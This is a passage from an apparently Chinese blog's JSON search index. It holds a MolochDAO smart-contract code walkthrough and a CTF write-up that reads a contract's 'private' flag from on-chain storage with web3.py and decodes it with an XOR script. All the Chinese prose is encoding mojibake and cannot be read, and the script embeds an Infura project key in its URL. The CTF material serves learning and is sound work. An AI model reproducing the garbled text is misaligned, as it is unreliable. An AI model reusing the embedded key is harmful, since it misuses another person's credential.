trueé€šè¿‡åŽå¦‚æžœç”³è¯·äººå·²ç»æ˜¯memberï¼Œåˆ™ç›´æŽ¥å°†ç”³è¯·äººçš„è‚¡æƒåŠ ä¸Šç”³è¯·çš„è‚¡æƒï¼Œå¦åˆ™å¦‚æžœç”³è¯·è€…åœ°å€å·²ç»è¢«æˆå‘˜çš„delegateKeyå ç”¨ï¼Œåˆ™å°†å…¶é‡ç½®ä¸ºæˆå‘˜åœ°å€ã€‚ä¹‹åŽé“¸é€ æ–°çš„è‚¡æƒï¼Œå¹¶å°†tokenTributeè½¬å…¥guildbank\næœ€åŽï¼Œå°†ä¼šç»™å¤„ç†ææ¡ˆçš„äººprocessingRewardæ•°é‡çš„å¥–åŠ±ï¼Œå‰©ä½™çš„proposalDepositå‘é€ç»™applicantã€‚\nmolochDAOçš„ç‰¹è‰²åŠŸèƒ½â€”-æ€’é€€\nfunction ragequit(uint256 sharesToBurn) public onlyMember &#123;\n    uint256 initialTotalShares = totalShares;\n\n    Member storage member = members[msg.sender];\n\n    require(member.shares >= sharesToBurn, \"Moloch::ragequit - insufficient shares\");\n\n    require(canRagequit(member.highestIndexYesVote), \"Moloch::ragequit - cant ragequit until highest index proposal member voted YES on is processed\");\n\n    // burn shares\n    member.shares = member.shares.sub(sharesToBurn);\n    totalShares = totalShares.sub(sharesToBurn);\n\n    // instruct guildBank to transfer fair share of tokens to the ragequitter\n    require(\n        guildBank.withdraw(msg.sender, sharesToBurn, initialTotalShares),\n        \"Moloch::ragequit - withdrawal of tokens from guildBank failed\"\n    );\n\n    emit Ragequit(msg.sender, sharesToBurn);\n&#125;\n\né¦–å…ˆæ£€æµ‹æ˜¯å¦æ»¡è¶³å¯ä»¥ragequitçš„æ¡ä»¶ï¼Œæ»¡è¶³åˆ™ç‡ƒçƒ§éƒ¨åˆ†è‚¡æƒå–å›žèµ„äº§\nfunction abort(uint256 proposalIndex) public &#123;\n    require(proposalIndex &lt; proposalQueue.length, \"Moloch::abort - proposal does not exist\");\n    Proposal storage proposal = proposalQueue[proposalIndex];\n\n    require(msg.sender == proposal.applicant, \"Moloch::abort - msg.sender must be applicant\");\n    require(getCurrentPeriod() &lt; proposal.startingPeriod.add(abortWindow), \"Moloch::abort - abort window must not have passed\");\n    require(!proposal.aborted, \"Moloch::abort - proposal must not have already been aborted\");\n\n    uint256 tokensToAbort = proposal.tokenTribute;\n    proposal.tokenTribute = 0;\n    proposal.aborted = true;\n\n    // return all tokens to the applicant\n    require(\n        approvedToken.transfer(proposal.applicant, tokensToAbort),\n        \"Moloch::processProposal - failed to return tribute to applicant\"\n    );\n\n    emit Abort(proposalIndex, msg.sender);\n&#125;\n\nç»ˆæ­¢å‡½æ•°ï¼Œç»ˆæ­¢æŒ‡å®šç¼–å·çš„ææ¡ˆï¼Œåªæœ‰applicantå¯æ‰§è¡Œæ­¤æ“ä½œï¼ŒåŒæ—¶è¿”è¿˜æ‰€æœ‰tribute\nfunction updateDelegateKey(address newDelegateKey) public onlyMember &#123;\n    require(newDelegateKey != address(0), \"Moloch::updateDelegateKey - newDelegateKey cannot be 0\");\n\n    // skip checks if member is setting the delegate key to their member address\n    if (newDelegateKey != msg.sender) &#123;\n        require(!members[newDelegateKey].exists, \"Moloch::updateDelegateKey - cant overwrite existing members\");\n        require(!members[memberAddressByDelegateKey[newDelegateKey]].exists, \"Moloch::updateDelegateKey - cant overwrite existing delegate keys\");\n    &#125;\n\n    Member storage member = members[msg.sender];\n    memberAddressByDelegateKey[member.delegateKey] = address(0);\n    memberAddressByDelegateKey[newDelegateKey] = msg.sender;\n    member.delegateKey = newDelegateKey;\n\n    emit UpdateDelegateKey(msg.sender, newDelegateKey);\n&#125;\n\næ›´æ–°delegatekeyï¼Œåªæœ‰memberå¯ä»¥æ“ä½œã€‚\n","slug":"one-example-to-know-DAO","date":"2022-08-01T10:30:36.709Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"ec8400bf6f96d412e898d5ce3ea11cc4","title":"A ctf challenge about variable storage","content":"å…³äºŽè¿™ä¸ªæŒ‘æˆ˜çš„Write upï¼\n\n\nCode//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.9;\n\n\ncontract Chal &#123;\n    string private flag;\n    address public owner = msg.sender;\n\n    constructor(string memory _flag) &#123;\n        flag = _flag;\n    &#125;\n\n    function random() private view returns (uint) &#123;\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, msg.sender)));        \n    &#125;\n\n    function query() public payable returns (bytes1) &#123;\n        require(msg.value >= 15 ether);\n        bytes memory _flag = bytes(flag);\n        bytes1 idx = bytes1(uint8(random() % _flag.length));\n        return _flag[uint8(idx)] ^ idx;\n    &#125;\n\n    function withdraw(address payable to) public &#123;\n        require (msg.sender == owner);\n        to.transfer(address(this).balance);\n    &#125;\n&#125;\n\né¢˜ç›®è¦æ±‚èŽ·å¾—flag\né¢˜ç›®åˆçº¦åˆ›å»ºè¯¦æƒ…ï¼šhttps://ropsten.etherscan.io/tx/0x1b8069c52d74ef0aa7c4692b5a7d77f2f1cafc0ad53d3b238748239645edbf03\nflag GoN{â€¦}\nFirst Analyzeé¢˜ç›®å¯è§stringå­˜å‚¨åœ¨slot0çš„ä½ç½®ï¼Œé€šè¿‡web3.pyå¯ä»¥æŸ¥è¯¢åˆ°è¯¥æ’æ§½å†…å­˜å‚¨çš„å†…å®¹ä»Žè€Œç›´æŽ¥èŽ·å¾—flagï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº†å…³äºŽsolidityå­˜å‚¨å­—ç¬¦ä¸²ç±»åž‹æ•°æ®çš„é—®é¢˜ã€‚\nå­—ç¬¦ä¸²æ•°æ®ç±»åž‹å­˜å‚¨åˆ†ä¸ºä¸¤ä¸ªæƒ…å†µï¼Œé¦–å…ˆè¦äº†è§£åˆ°ï¼Œæ¯ä¸ªå­—æ¯å 2ä¸ªåå…­è¿›åˆ¶ä½ï¼Œæ¯ä¸ªæ±‰å­—å 6ä¸ªåå…­è¿›åˆ¶ä½ \ncase1\nåå…­è¿›åˆ¶ä½å°äºŽ64ä½ï¼Œç›´æŽ¥å­˜å‚¨åœ¨å¯¹åº”æ’æ§½\ncase2\nåå…­è¿›åˆ¶ä½å¤§äºŽ64ä½ï¼Œå­˜å‚¨æ–¹å¼ç±»ä¼¼æ•°ç»„ï¼Œå¯¹åº”æ’æ§½å­˜å‚¨é•¿åº¦ï¼Œå®žé™…å†…å®¹å­˜å‚¨åœ¨keccak256(x)ï¼Œx&#x3D;slot(string)ï¼Œè¯¥é¢˜å¯¹åº”çš„xä¸º0\nè„šæœ¬èŽ·å¾—å­—ç¬¦ä¸²é•¿åº¦ä¸º0x53å¤§äºŽ64ä½ï¼Œæ‰€ä»¥å¯¹åº”case2\nFirst tryfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))\nprint(w3.eth.getStorageAt(address,0))\na=w3.eth.getStorageAt(address,Web3.sha3(0))\nb=w3.eth.getStorageAt(address,Web3.sha3(0)+1)\nprint(a+b)\n\nèŽ·å¾—å¦‚ä¸‹å­—ç¬¦ä¸²\nGnLxqvoioVhgcnelxp{}KayHs|\\x7fkCy\\x7fkA~RVFIODU\næ‰€å¾—flagä¸ºä¹±ç è¿˜åŒ…å«ä¸å¯è§å­—ç¬¦ï¼Œè¯æ˜Žå­˜åœ¨é—®é¢˜\nå°è¯•ä½¿ç”¨å‡¯æ’’å¯†ç å’Œç»´å‰å°¼äºšå¯†ç çš„è§£å¯†æ–¹å¼æ— æ³•èŽ·å¾—flagï¼Œå›žå½’solidityä»£ç ç»§ç»­åˆ†æž\nSecond Analyzeå…³æ³¨ä»£ç ä¸­çš„query()éƒ¨åˆ†\nfunction query() public payable returns (bytes1) &#123;\n        require(msg.value >= 15 ether);\n        bytes memory _flag = bytes(flag);\n        bytes1 idx = bytes1(uint8(random() % _flag.length));\n        return _flag[uint8(idx)] ^ idx;\n    &#125;\n\nå¯¹è¯¥å‡½æ•°è¿›è¡Œåˆ†æžç”±äºŽrequireè¦æ±‚è°ƒç”¨ä¸€æ¬¡éœ€è¦15ethå¹¶ä¸”randomä¸ç¡®å®šï¼Œä»Žè€Œæ‰“æ¶ˆäº†ç›´æŽ¥è°ƒç”¨èŽ·å¾—å¹¶æ‹¼æŽ¥èŽ·å¾—flagçš„æƒ³æ³•\nä½†æ˜¯è¯¥å‡½æ•°æœ‰ä¸€ç‚¹å€¼å¾—æ³¨æ„çš„æ˜¯returnå¤„_flag[uint8(idx)] ^ idxå…¶ä¸­æ˜¯bytesç±»åž‹çš„ _flagçš„ç¬¬idxä½ä¸Židxè¿›è¡Œå¼‚æˆ–è¿ç®—(1å¯¹1ä¸º0ï¼Œ0å¯¹0ä¸º0ï¼Œ1å¯¹0ä¸º1ï¼Œ0å¯¹1ä¸º1)è™½ç„¶éšæœºæ•°randomä¸å¯æŽ§ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªè¡Œæž„å»ºè„šæœ¬ï¼Œå®žçŽ°idxå¯æŽ§ä»Žè€Œä¸ä½¿ç”¨åˆçº¦ä¸­çš„å‡½æ•°å¹¶æŒ‰ç…§é¢˜ç›®æ–¹æ³•è¿›è¡Œè®¡ç®—å¹¶æ‹¼æŽ¥å³å¯\nFinal Tryfrom Crypto.Util.number import *\n\n\nstr=\"476e4c7871766f696f566867636e656c78707b7d4b617948737c7f6b43797f6b417e525646494f4455\"\nflag=''\nj=0\nfor i in range(len(str)-1):\n    if i%2==0:\n        _str=int(str[i:i+2],16)\n        flag+=(hex(_str^j))[2:]\n        j+=1\na=int(flag,16)\nprint(long_to_bytes(a))//é¢˜ç›®ä¸­bytes1ç±»åž‹æ˜¯åœ¨æ¯ä¸¤ä½è¿›è¡Œå¼‚æˆ–\n\nè¿è¡Œè„šæœ¬å¾—åˆ°flagï¼šGoN{using_blockchain_to_keep_data_public}\nSummaryåœ¨é‡åˆ°ç›¸ä¼¼çš„é¡ºåºç±»åŠ å¯†é—®é¢˜æ—¶ï¼Œé¦–å…ˆè€ƒè™‘å‡¯æ’’å¯†ç å’Œç»´å‰å°¼äºšå¯†ç ï¼Œå¦‚æžœè¿™ä¸¤ç§æ–¹æ³•è§£å¯†å¤±è´¥é‚£å°±è¦å›žè¿‡å¤´åŽ»å¯»æ‰¾é¢˜ç›®ç»™å‡ºçš„ä¿¡æ¯ï¼Œhintä¹Ÿå¥½è¿˜æ˜¯é¢˜ç›®ä»£ç ä¹Ÿå¥½ï¼Œä¸€å®šæ˜¯æœ‰æ‰€é—æ¼ï¼Œå›žå½’ä»£ç ä»”ç»†å®¡è®¡ï¼Œå¾—åˆ°è§£å†³æ–¹æ¡ˆã€‚\n","slug":"gonctf","date":"2022-07-05T00:45:24.373Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"}]